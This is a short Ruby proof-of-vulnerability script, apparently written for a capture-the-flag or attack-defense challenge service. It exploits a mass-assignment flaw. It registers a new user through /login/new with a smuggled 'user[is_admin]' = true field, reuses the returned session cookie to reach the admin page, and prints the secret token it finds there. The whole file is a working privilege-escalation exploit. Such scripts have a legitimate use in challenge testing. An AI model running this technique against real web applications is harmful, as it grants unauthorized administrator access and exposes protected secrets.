#!/bin/env ruby

require "logger"

require "http"
require "nokogiri"

require 'active_support/core_ext/object/to_query'

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end)

MAX_PIN =  0xffffffffffffffff

class Pov
  attr_reader :host, :port


  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = ENV['PORT'] || '3013'
  end

  def run!
    slug = rand(0..1_000_000)
    name = "pov_make_admin_user #{slug}"

    attrs = {'user[name]' => name,
             'user[password]': name,
             'user[password_confirmation]': name,
             'user[is_admin]': true}
    resp = client.post "/login/new", form: attrs
    puts resp.body.to_s
    assert_equal(302, resp.status)
    assert_equal('/login/did_login', resp['Location'])

    logged_in_cxs = HTTP::Cookie.cookie_value(
      resp.cookies.cookies("http://#{@host}/login/did_login"))

    im_in_resp = client.
                   headers(cookie: logged_in_cxs).
                   get(resp['Location'])
    puts im_in_resp.body.to_s
    assert_equal(200, im_in_resp.status)
    doc = Nokogiri::HTML(im_in_resp.body.to_s)

    assert_equal "beacon admin", doc.css('h1').text

    puts "TOKEN=#{doc.css('#token').text}"
  end

  private
  def client
    return @client if defined? @client

    @client = HTTP.persistent "http://#{@host}:#{@port}"
  end

  def assert_equal(expected, actual)
    assert(expected == actual, "expected #{expected} to == #{actual}")
  end

  def assert(predicate, message='failed assertion')
    return if predicate
    fail message
  end
end

pov = Pov.new
at_exit do
  LLL.info((["ruby", $0] + ARGV).join(' '))
end
pov.run!

LLL.info "success :)"
